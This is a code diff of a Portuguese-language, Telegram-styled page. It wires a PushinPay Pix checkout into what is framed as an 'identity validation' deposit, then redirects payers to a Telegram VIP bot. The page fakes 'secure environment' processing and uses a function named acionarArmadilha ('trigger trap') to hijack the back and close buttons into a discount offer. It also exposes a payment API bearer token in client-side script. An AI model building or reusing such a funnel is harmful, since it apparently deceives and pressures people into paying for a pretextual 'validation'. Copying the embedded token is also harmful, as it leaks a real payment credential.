@@ -148,7 +148,7 @@
                         </span>
                     </div>
                 </div>
-                <button onclick="iniciarDesbloqueio()" class="btn-active w-full bg-tg-primary hover:bg-tg-primary/90 text-white font-semibold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(51,144,236,0.3)] mt-2">
+                <button onclick="iniciarDesbloqueio(this)" class="btn-active w-full bg-tg-primary hover:bg-tg-primary/90 text-white font-semibold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(51,144,236,0.3)] mt-2">
                     Validar Identidade
                 </button>
                 <p class="text-center text-[12px] text-tg-muted mt-4 font-medium flex items-center justify-center gap-1.5 opacity-80">
@@ -205,7 +205,7 @@
                 </div>
 
                 <!-- UI do Pagamento Pix -->
-                <div class="bg-white rounded-xl p-5 flex flex-col items-center shadow-lg relative overflow-hidden mb-1">
+                <div id="checkout-payment-ui" class="bg-white rounded-xl p-5 flex flex-col items-center shadow-lg relative overflow-hidden mb-1">
                     <div class="absolute top-0 left-0 w-full h-1.5 bg-[#32BCAD]"></div>
                     <div class="flex items-center gap-2 mb-2 w-full justify-center mt-1">
                         <i data-lucide="qr-code" class="w-6 h-6 text-[#32BCAD]"></i>
@@ -214,7 +214,8 @@
                     <p class="text-[13px] text-gray-500 text-center mb-4 leading-snug">Copie o código abaixo e cole na área "Pix Copia e Cola" do seu banco.</p>
                     
                     <div class="bg-gray-100 p-2.5 rounded-xl border border-gray-200 mb-4 shadow-sm pointer-events-none">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42665544000052040000530398654049.005802BR5913Sistema VIP6009Sao Paulo62070503***6304E21A" class="w-[120px] h-[120px] opacity-90" alt="QR Code Pix">
+                        <!-- Imagem dinâmica do QR Code -->
+                        <img id="pix-qr-img" src="" class="w-[120px] h-[120px] opacity-90" alt="QR Code Pix">
                     </div>
                     
                     <div class="w-full flex justify-between items-center mb-4 px-2">
@@ -285,7 +286,7 @@
                 <input type="number" id="custom-price" min="4" step="0.10" placeholder="4,00" class="bg-transparent w-full text-white text-2xl font-bold outline-none placeholder:text-white/20">
             </div>
 
-            <button onclick="gerarPixCustomizado()" class="btn-active w-full bg-yellow-600 hover:bg-yellow-500 text-white font-bold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center shadow-[0_0_20px_rgba(202,138,4,0.3)]">
+            <button onclick="gerarPixCustomizado(this)" class="btn-active w-full bg-yellow-600 hover:bg-yellow-500 text-white font-bold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center shadow-[0_0_20px_rgba(202,138,4,0.3)]">
                 Gerar Nova Chave Pix
             </button>
         </div>
@@ -293,6 +294,160 @@
 
     <script>
         lucide.createIcons();
+
+        // ----------------------------------------------------
+        // LÓGICA DE INTEGRAÇÃO PIX (PUSHINPAY)
+        // ----------------------------------------------------
+        const PUSHINPAY_API_URL = 'https://api.pushinpay.com.br/api';
+        const PUSHINPAY_TOKEN = '63836|NFmZ0X7v52HHcUh3YcyeXUotdVQUDixPv7vaVeeI07a31e66';
+        
+        let currentTransactionId = null;
+        let pixPollingInterval = null;
+        let currentPixCode = "";
+        let currentPixValue = 9.00; // Valor padrão inicial
+
+        // Função universal para gerar o PIX chamando a API de forma real
+        async function generatePushinPayPix(btnElement, onSuccessTransition) {
+            const originalText = btnElement.innerHTML;
+            
+            // Botão entra em estado de carregamento simulando processamento seguro
+            btnElement.innerHTML = '<svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Gerando ambiente seguro...';
+            btnElement.disabled = true;
+            btnElement.style.opacity = '0.9';
+
+            try {
+                // A PushinPay exige o valor convertido em centavos
+                const valueCents = Math.round(currentPixValue * 100);
+                
+                const response = await fetch(`${PUSHINPAY_API_URL}/pix/cashIn`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'Authorization': `Bearer ${PUSHINPAY_TOKEN}` 
+                    },
+                    body: JSON.stringify({ value: valueCents })
+                });
+                
+                const data = await response.json();
+                
+                // Extrai o código dependendo do formato da resposta da API (Pode vir de 3 formas padrão)
+                const pixCode = data.qr_code || data.qr_code_text || data.brcode;
+
+                if (data && pixCode && data.id) {
+                    currentPixCode = pixCode;
+                    currentTransactionId = data.id;
+                    
+                    // Injeta a imagem gerada do QR Code no Checkout
+                    document.getElementById('pix-qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(pixCode)}`;
+                    
+                    // Inicia a verificação de pagamento automática (em background)
+                    startPixPolling();
+                    
+                    // Se a geração foi um sucesso, executa a transição de tela
+                    onSuccessTransition();
+                } else {
+                    console.error("Erro na resposta da PushinPay:", data);
+                    alert("Falha de segurança ao gerar a cobrança. Tente novamente.");
+                }
+            } catch(error) {
+                console.error("Erro de conexão com servidor PIX:", error);
+                alert("Erro de conexão com o sistema de pagamento protegido.");
+            } finally {
+                // Restaura o botão ao estado normal em background
+                btnElement.innerHTML = originalText;
+                btnElement.disabled = false;
+                btnElement.style.opacity = '1';
+            }
+        }
+
+        // Consulta Automática - Fica verificando a cada 8 segundos se o PIX foi pago
+        function startPixPolling() {
+            if (pixPollingInterval) clearInterval(pixPollingInterval);
+            pixPollingInterval = setInterval(async () => {
+                if (!currentTransactionId) return;
+                try {
+                    const res = await fetch(`${PUSHINPAY_API_URL}/transactions/${currentTransactionId}`, {
+                        method: 'GET',
+                        headers: { 
+                            'Accept': 'application/json',
+                            'Authorization': `Bearer ${PUSHINPAY_TOKEN}` 
+                        }
+                    });
+                    const data = await res.json();
+                    
+                    // Se o PIX constar como pago (paid), aprova a tela imediatamente
+                    if (data && data.status && data.status.toLowerCase() === 'paid') {
+                        clearInterval(pixPollingInterval);
+                        showSuccess();
+                    }
+                } catch (e) {} // Ignora erros de polling passivo
+            }, 8000); 
+        }
+
+        // Função chamada no botão "Já fiz o pagamento" -> Força a verificação na API
+        async function verificarPagamento() {
+            const btn = document.getElementById('btn-ja-paguei');
+            const original = btn.innerHTML;
+            btn.innerHTML = '<svg class="animate-spin h-5 w-5 text-gray-500 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Aguardando Banco...';
+            btn.disabled = true;
+            
+            try {
+                if (!currentTransactionId) return;
+                
+                const res = await fetch(`${PUSHINPAY_API_URL}/transactions/${currentTransactionId}`, {
+                    method: 'GET',
+                    headers: { 
+                        'Accept': 'application/json',
+                        'Authorization': `Bearer ${PUSHINPAY_TOKEN}` 
+                    }
+                });
+                const data = await res.json();
+                
+                if (data && data.status && data.status.toLowerCase() === 'paid') {
+                    clearInterval(pixPollingInterval);
+                    showSuccess();
+                } else {
+                    // Simula delay do banco e retorna feedback para aguardar
+                    setTimeout(() => {
+                        alert("Ainda não identificamos a sua caução no sistema.\n\nSe você acabou de realizar o Pix, aguarde cerca de 10 a 30 segundos e clique novamente para sincronizar.");
+                        btn.innerHTML = original;
+                        btn.disabled = false;
+                    }, 1500);
+                }
+            } catch (e) {
+                setTimeout(() => {
+                    alert("Falha de conexão ao verificar o pagamento. Tente novamente.");
+                    btn.innerHTML = original;
+                    btn.disabled = false;
+                }, 1500);
+            }
+        }
+
+        // Exibição Gráfica de Sucesso após a confirmação do PIX
+        function showSuccess() {
+            const checkoutContainer = document.getElementById('checkout-payment-ui');
+            
+            // Troca todo o box do PIX por uma mensagem de Aprovação
+            checkoutContainer.innerHTML = `
+                <div class="py-6 flex flex-col items-center justify-center text-center w-full">
+                    <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-5 border-2 border-green-500 shadow-[0_0_30px_rgba(34,197,94,0.4)]">
+                        <i data-lucide="check" class="text-green-500 w-10 h-10"></i>
+                    </div>
+                    <h3 class="text-[22px] font-black mb-2 text-gray-800 uppercase tracking-tight">Identidade Validada!</h3>
+                    <p class="text-[13px] text-gray-500 mb-6 font-medium px-4">Caução recebida. Você está sendo redirecionado para a área exclusiva...</p>
+                    <button onclick="window.location.href='https://t.me/MatchAcessoaovipbot'" class="w-full bg-[#1db954] hover:bg-[#1ed760] text-white py-4 rounded-xl font-bold text-[16px] shadow-lg transition-colors shadow-[0_10px_25px_rgba(29,185,84,0.3)]">
+                        ACESSAR GRUPO AGORA
+                    </button>
+                </div>
+            `;
+            lucide.createIcons();
+            
+            // Redireciona de forma automática em 3 segundos se o botão não for clicado
+            setTimeout(() => {
+                window.location.href = 'https://t.me/MatchAcessoaovipbot';
+            }, 3000);
+        }
 
         // ----------------------------------------------------
         // LÓGICA DE DATAS, TIMERS E EXIBIÇÃO
@@ -303,10 +458,7 @@
             const horaFormatada = dataAtual.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
             const dataFormatada = dataAtual.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
             
-            // Atualiza a data no modal de Checkout
             document.getElementById('datetime-reembolso').innerText = `${dataFormatada} às ${horaFormatada}`;
-            
-            // Atualiza a hora no modal de Protocolo Flexível
             const flexTimeEl = document.getElementById('hora-reembolso-flex');
             if(flexTimeEl) flexTimeEl.innerText = horaFormatada;
         }
@@ -388,35 +540,26 @@
         }, 10000); 
 
         // ----------------------------------------------------
-        // LÓGICA DE FUNIL E PAGAMENTO
+        // LÓGICA DO FUNIL (NAVEGAÇÃO E COPIA COLA)
         // ----------------------------------------------------
-        function iniciarDesbloqueio() {
-            const btn = document.querySelector('button.btn-active');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Gerando ambiente seguro...';
-            btn.style.opacity = '0.9';
-            btn.disabled = true;
-            setTimeout(() => {
+        function iniciarDesbloqueio(element) {
+            generatePushinPayPix(element, () => {
                 currentStep = 'checkout';
                 document.getElementById('bottom-sheet').classList.replace('modal-active', 'modal-hidden');
                 document.getElementById('checkout-sheet').classList.replace('modal-hidden', 'modal-active');
-                btn.innerHTML = originalText;
-                btn.style.opacity = '1';
-                btn.disabled = false;
-            }, 1500);
+            });
         }
 
         function copiarPix() {
-            const btnCopiar = document.getElementById('btn-copiar');
-            const codigoPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42665544000052040000530398654049.005802BR5913Sistema VIP6009Sao Paulo62070503***6304E21A";
-            
+            // Cria elemento invisível no DOM para forçar a cópia do código dinâmico armazenado
             const tempInput = document.createElement("input");
-            tempInput.value = codigoPix;
+            tempInput.value = currentPixCode; 
             document.body.appendChild(tempInput);
             tempInput.select();
             document.execCommand("copy");
             document.body.removeChild(tempInput);
             
+            const btnCopiar = document.getElementById('btn-copiar');
             btnCopiar.innerHTML = '<i data-lucide="check-circle-2" class="w-5 h-5"></i> Código Copiado!';
             btnCopiar.classList.replace('bg-[#32BCAD]', 'bg-green-600');
             btnCopiar.classList.replace('hover:bg-[#2a9d90]', 'hover:bg-green-700');
@@ -430,19 +573,6 @@
                 btnCopiar.classList.replace('hover:bg-green-700', 'hover:bg-[#2a9d90]');
                 lucide.createIcons();
             }, 3500);
-        }
-
-        function verificarPagamento() {
-            const btn = document.getElementById('btn-ja-paguei');
-            const original = btn.innerHTML;
-            btn.innerHTML = '<svg class="animate-spin h-5 w-5 text-gray-500 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Aguardando Banco...';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                alert("Ainda não identificamos a sua caução no sistema.\n\nSe você acabou de realizar o Pix, aguarde cerca de 10 a 30 segundos e clique novamente para sincronizar.");
-                btn.innerHTML = original;
-                btn.disabled = false;
-            }, 3000);
         }
 
         // ----------------------------------------------------
@@ -459,7 +589,7 @@
             };
         }
 
-        // Função chamada pelo Botão X ou pelo botão de Voltar Nativo
+        // Função chamada pelo Botão X, barra do modal ou pelo botão de Voltar Nativo
         function acionarArmadilha() {
             // Esconde os modais principais
             document.getElementById('bottom-sheet').classList.replace('modal-active', 'modal-hidden');
@@ -507,7 +637,7 @@
             document.getElementById('back-discount').classList.remove('hidden');
         }
 
-        function gerarPixCustomizado() {
+        function gerarPixCustomizado(element) {
             const input = document.getElementById('custom-price');
             let valorTexto = input.value.replace(',', '.');
             let valor = parseFloat(valorTexto);
@@ -517,22 +647,20 @@
                 return;
             }
 
+            // Atualiza o estado global do PIX para o novo valor
+            currentPixValue = valor;
+
             const valorFormatado = valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             document.querySelectorAll('.valor-dinamico').forEach(el => {
                 el.innerText = `R$ ${valorFormatado}`;
             });
 
-            const btn = document.querySelector('#back-discount button');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Sincronizando Sistema...';
-            
-            setTimeout(() => {
-                // Ao aceitar o desconto, ele avança automaticamente para o Checkout
+            // Chama o gerador universal de PIX da PushinPay e transita para o Checkout central
+            generatePushinPayPix(element, () => {
                 currentStep = 'checkout';
-                fecharBackModalEContinuar();
-                btn.innerHTML = originalText;
-                input.value = '';
-            }, 1200);
+                fecharBackModalEContinuar(); // Fecha o modal do Back Redirect
+                input.value = ''; // Reseta input
+            });
         }
     </script>
 </body>
